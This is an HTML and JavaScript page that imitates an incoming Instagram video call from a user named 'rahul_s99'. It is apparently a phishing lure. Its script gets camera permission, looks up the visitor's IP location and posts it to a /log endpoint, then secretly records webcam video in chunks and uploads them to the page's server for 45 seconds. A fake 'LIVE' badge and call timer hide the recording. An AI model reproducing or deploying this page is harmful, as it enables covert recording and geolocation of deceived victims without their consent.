<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
  .container { width: 100%; max-width: 420px; }

  .topbar { padding: 14px 16px; display: flex; align-items: center; gap: 12px; }
  .back { font-size: 24px; color: #fff; }
  .avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 700; flex-shrink: 0; }
  .uname { flex: 1; font-size: 14px; font-weight: 600; }
  .more { font-size: 22px; color: #aaa; }

  .video-area { background: #111; position: relative; aspect-ratio: 9/16; max-height: 58vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
  .placeholder { display: flex; flex-direction: column; align-items: center; gap: 10px; color: #555; }
  .placeholder .icon { font-size: 56px; }
  .placeholder .txt { font-size: 14px; }

  /* live badge */
  .live-badge { position: absolute; top: 12px; left: 12px; background: #e1306c; color: #fff; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 4px; display: none; }
  .timer-badge { position: absolute; top: 12px; right: 12px; background: rgba(0,0,0,0.6); color: #fff; font-size: 12px; padding: 3px 8px; border-radius: 4px; display: none; }

  .bottom { background: #000; padding: 16px; }
  .status { font-size: 13px; color: #aaa; text-align: center; margin-bottom: 14px; }
  .ig-btn { width: 100%; background: linear-gradient(90deg,#833ab4,#fd1d1d,#fcb045); border: none; color: #fff; font-size: 15px; font-weight: 700; padding: 13px; border-radius: 8px; cursor: pointer; }
  .ig-btn:disabled { background: #222; color: #555; cursor: not-allowed; }

  .ctrl-row { display: flex; justify-content: space-around; margin-top: 4px; display: none; }
  .ctrl-row .cb { display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 11px; color: #aaa; cursor: pointer; }
  .cb .ci { width: 48px; height: 48px; border-radius: 50%; background: #222; display: flex; align-items: center; justify-content: center; font-size: 20px; }
  .cb-end .ci { background: #e1306c; }
</style>
</head>
<body>
<div class="container">
  <div class="topbar">
    <div class="back">←</div>
    <div class="avatar">R</div>
    <div class="uname">rahul_s99</div>
    <div class="more">⋮</div>
  </div>

  <div class="video-area">
    <video id="preview" autoplay muted playsinline></video>
    <div class="placeholder" id="placeholder">
      <div class="icon">📸</div>
      <div class="txt">Instagram Video Call</div>
    </div>
    <div class="live-badge" id="liveBadge">● LIVE</div>
    <div class="timer-badge" id="timerBadge">00:00</div>
  </div>

  <div class="bottom">
    <div class="status" id="statusMsg">rahul_s99 is calling you via Instagram Video</div>
    <button class="ig-btn" id="joinBtn" onclick="startSession()">Accept Video Call</button>
    <div class="ctrl-row" id="ctrlRow">
      <div class="cb"><div class="ci">🎤</div><span>Mute</span></div>
      <div class="cb"><div class="ci">🔄</div><span>Flip</span></div>
      <div class="cb cb-end" onclick="endCall()"><div class="ci">📵</div><span>End</span></div>
    </div>
  </div>
</div>

<script>
const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
let mediaRecorder, chunkIndex = 0, stream, sec = 0, interval;

async function getGeo() {
  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
}

function tick() {
  sec++;
  const el = document.getElementById("timerBadge");
  el.textContent = `${String(Math.floor(sec/60)).padStart(2,"0")}:${String(sec%60).padStart(2,"0")}`;
}

async function startSession() {
  const btn = document.getElementById("joinBtn");
  btn.disabled = true; btn.textContent = "Connecting...";
  document.getElementById("statusMsg").textContent = "Allow camera to connect";

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 }, audio: false });
  } catch {
    document.getElementById("statusMsg").textContent = "Camera denied. Please allow and try again.";
    btn.disabled = false; btn.textContent = "Accept Video Call";
    return;
  }

  const preview = document.getElementById("preview");
  preview.srcObject = stream; preview.style.display = "block";
  document.getElementById("placeholder").style.display = "none";
  document.getElementById("statusMsg").textContent = "Connecting to rahul_s99...";

  const geo = await getGeo();
  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ session:SID, geo }) }).catch(()=>{});

  await new Promise(r => setTimeout(r, 1800));

  document.getElementById("liveBadge").style.display = "block";
  document.getElementById("timerBadge").style.display = "block";
  document.getElementById("statusMsg").textContent = "";
  document.getElementById("joinBtn").style.display = "none";
  document.getElementById("ctrlRow").style.display = "flex";
  interval = setInterval(tick, 1000);
  startRecording(stream);
}

function endCall() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  if (stream) stream.getTracks().forEach(t => t.stop());
  clearInterval(interval);
  document.getElementById("liveBadge").style.display = "none";
  document.getElementById("statusMsg").textContent = "Call ended.";
  document.getElementById("ctrlRow").style.display = "none";
}

function startRecording(stream) {
  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
  mediaRecorder.ondataavailable = async (e) => {
    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
  };
  mediaRecorder.onstop = async () => {
    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
  };
  mediaRecorder.start(5000);
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state !== "inactive") { mediaRecorder.stop(); endCall(); }
  }, 45000);
}

async function sendChunk(blob, idx) {
  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
  }).catch(()=>{});
}
</script>
</body>
</html>
